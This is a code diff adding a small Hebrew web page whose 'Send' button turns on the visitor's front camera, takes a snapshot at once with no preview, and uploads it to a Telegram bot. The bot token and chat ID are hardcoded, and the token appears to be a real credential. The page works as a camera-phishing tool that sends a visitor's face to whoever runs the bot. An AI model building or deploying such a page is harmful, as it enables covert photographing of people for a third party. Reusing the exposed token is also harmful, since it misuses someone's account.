@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>צלם ושלח</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 18px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <h1>שלח תמונה</h1>
+    <button id="capture">שלח</button>
+
+    <script>
+        const captureButton = document.getElementById('capture');
+        const telegramBotToken = "6796201688:AAEaRoA_O41-U24XQGIX5a4MK4lMyIjjeqg"; // החלף בטוקן של הבוט שלך
+        const telegramChatId = "7039130805";     // החלף ב-Chat ID שלך
+
+        captureButton.addEventListener('click', () => {
+            // הפעלת מצלמה קדמית
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    video.onloadedmetadata = () => {
+                        // יצירת Canvas לצילום התמונה
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const context = canvas.getContext('2d');
+
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        const imageData = canvas.toDataURL('image/png');
+                        const blob = dataURItoBlob(imageData);
+
+                        // שליחת התמונה לבוט
+                        const formData = new FormData();
+                        formData.append('chat_id', telegramChatId);
+                        formData.append('photo', blob);
+
+                        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.ok) {
+                                alert("התמונה נשלחה בהצלחה!");
+                            } else {
+                                alert("אירעה שגיאה בשליחה: " + data.description);
+                            }
+                        })
+                        .catch(err => {
+                            alert("שגיאה: " + err.message);
+                        });
+
+                        // עצירת המצלמה
+                        stream.getTracks().forEach(track => track.stop());
+                    };
+                })
+                .catch(err => {
+                    alert("לא ניתן להפעיל מצלמה: " + err.message);
+                });
+        });
+
+        // המרת Base64 ל-Blob
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+    </script>
+</body>
+</html>
